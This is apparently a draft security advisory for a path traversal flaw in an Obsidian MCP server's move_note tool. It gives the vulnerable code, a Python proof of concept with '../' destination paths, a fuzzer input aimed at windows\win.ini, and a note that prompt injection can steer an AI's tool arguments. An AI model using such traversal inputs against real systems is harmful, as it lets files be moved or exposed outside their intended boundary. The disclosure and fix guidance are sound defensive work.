# Path traversal in `move_note`: `sourcePath`/`destinationPath` can read from and write outside the vault

**Repository:** `newtype-01/obsidian-mcp` · **Tool:** `move_note` · **Tested commit:** `dc048e4`
**Weakness:** CWE-22 Path Traversal

## Summary
`move_note` renames a note from `sourcePath` to `destinationPath` within the vault. When the Obsidian Local
REST API is unreachable, the tool falls back to `fs.renameSync` and joins both caller paths to the vault root
with no containment check. `../` segments in either argument resolve outside the vault, so a caller can move
a note out of the vault (or move an external file in) across the vault boundary.

## Details
`handleMoveNote` passes both paths to `moveNote` (`src/index.ts:1511`). The filesystem fallback builds both
targets with `path.join` and never checks containment (`src/index.ts:2393`):

```ts
} catch (error) {
  const sourceFullPath = path.join(VAULT_PATH, sourcePath);        // 2411
  const destFullPath   = path.join(VAULT_PATH, destinationPath);   // 2412
  if (!fs.existsSync(sourceFullPath)) throw new Error(`Source note not found: ${sourcePath}`);
  if (fs.existsSync(destFullPath))    throw new Error(`Destination already exists: ${destinationPath}`);
  const destDir = path.dirname(destFullPath);
  if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
  fs.renameSync(sourceFullPath, destFullPath);                     // 2432
}
```

`node`'s `path.join` collapses `..`, and there is no `path.resolve` + `startsWith(VAULT_PATH)` guard. The
fallback runs whenever the Local REST API is unreachable (the default when that plugin is not configured).

## Steps to reproduce
1. Prerequisites: Node 16+. Do not run the Obsidian Local REST API (so the filesystem fallback is used).
2. Build, point the server at an empty vault, and create a marker note to move:
   ```
   npm install && npm run build
   mkdir -p /tmp/tofu-vault /tmp/tofu-poc
   echo "marker" > /tmp/tofu-vault/marker.md
   ```
3. Call the tool. Arguments as JSON:
   `{"sourcePath": "marker.md", "destinationPath": "../tofu-poc/moved.md"}`
   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="node", args=["build/index.js"],
           env={"OBSIDIAN_VAULT_PATH": "/tmp/tofu-vault"})
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool(
                   "move_note",
                   {"sourcePath": "marker.md", "destinationPath": "../tofu-poc/moved.md"})
               print(result)

   asyncio.run(main())
   ```
4. Observe that `/tmp/tofu-vault/marker.md` is gone and `/tmp/tofu-poc/moved.md` now exists, i.e. the note was
   renamed to a path outside the vault (`path.join('/tmp/tofu-vault', '../tofu-poc/moved.md')` ->
   `/tmp/tofu-poc/moved.md`). A `../` chain in `sourcePath` likewise lets the tool pull an existing external
   file into the vault.

## Expected behavior
Both `sourcePath` and `destinationPath` should resolve under `VAULT_PATH`; anything outside should be rejected.

## Actual behavior
The move crosses the vault boundary and the tool reports success, e.g.
`{'content': [{'type': 'text', 'text': 'Note moved successfully from ..\\..\\..\\..\\windows\\win.ini to notes/renamed_note.md'}]}`.

## Impact
`sourcePath` and `destinationPath` are chosen by the LLM and can be steered by prompt injection from
untrusted content. The move acts in both directions across the vault boundary: exfiltrate a note to a
world-readable location, or relocate/rename a file outside the vault. Impact is bounded by the process's
filesystem permissions and the guards that `destination already exists` / `source not found`.

## Suggested fix
Resolve both paths with `path.resolve(VAULT_PATH, x)` and reject either unless it stays under
`path.resolve(VAULT_PATH) + path.sep` before `fs.renameSync`.

## Status on the default branch
Still present at `dc048e4` (2025-08-04). The current default branch head is the same commit that was tested.

## Prior reports
- #12 "[Potential Vulnerability] arbitrary file read / write / delete via the filesystem fallback in `obsidian-mcp`" (issue, open 2026-07-26): reports this bug. It names `move_note(sourcePath, destinationPath)` and states that `move_note` (`fs.renameSync`) shares the same unconfined `path.join`, giving rename/overwrite outside the vault. Verified against the same commit `dc048e4`. No maintainer response or fix in the JSON.
- #14 "Request: enable Private Vulnerability Reporting (or share a security contact)" (issue, open 2026-08-19): asks for a private channel for an undisclosed issue and states a 90-day disclosure date of 17 November 2026. No details, so overlap is unknown.
- Documentation: README.md: "Dual API Strategy: Obsidian REST API with filesystem fallback for maximum reliability"; CLAUDE.md describes `move_note` as using "filesystem-level operations (fs.renameSync)". Neither says the paths are confined to the vault or warns about it. There is no SECURITY.md or docs/ directory.

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: already reported in open issue #12 (names `move_note` and its `fs.renameSync` fallback, same commit). Not fixed. Do not file a new issue; at most add the fuzzer evidence as a comment on #12.
- ToFu class / sanitizers: path-traversal (CWE-22); `check_path_traversal` fired; `check_reflected_output`
  and `check_unexpected_crash` also listed for the tool.
- Campaigns and executions: repo24 (177,152 / 320, 4200s) and e2-0922 (1,024 / 11, 60s). Low success count.
- Evidence (verbatim, trimmed): input `{'sourcePath': '..\\..\\..\\..\\windows\\win.ini', 'destinationPath':
  'notes/renamed_note.md'}` -> `Note moved successfully from ... to notes/renamed_note.md`.
- Hand-check hints: REAL at code level (both paths via `path.join` with no containment, src/index.ts:2411-2412,
  rename at 2432). Evidence is weaker than create_note: a successful rename requires the source to exist and
  the destination not to exist, yet the evidence `sourcePath` (`..\..\windows\win.ini`, Windows backslashes)
  would not exist on a POSIX fuzz host, so the "moved successfully" line in that row most likely came from the
  mocked/echoing API branch rather than a real filesystem rename. The repro above avoids that ambiguity by
  creating a real marker note inside the vault first. Low success/exec ratio is consistent with most fuzzed
  inputs failing the source-exists check.
</details>
